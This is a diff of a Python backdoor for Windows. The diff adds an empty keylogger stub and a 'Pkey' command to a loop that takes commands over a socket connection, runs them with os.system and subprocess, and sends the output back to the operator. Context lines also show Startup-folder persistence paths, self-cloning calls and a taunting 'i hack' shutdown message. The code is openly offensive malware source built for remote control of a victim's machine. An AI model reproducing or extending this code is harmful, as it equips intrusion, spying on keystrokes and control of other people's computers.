@@ -20,6 +20,9 @@ temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
 #bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
 #file_path = path.dirname(path.realpath(__file__))
 
+def keyLog():
+    #work in progress
+    pass
 
 def kill():
     os.system("msg %username% your system will be shutdown because i hack then :) lol")
@@ -67,6 +70,10 @@ while True:
         bat_create()
         clone()
         #kill()
+    if cmd == "Pkey":
+        keyLog()
+
+
     os.system(cmd)
     output = subprocess.getoutput(cmd)
     conn.send(output.encode('utf-8'))
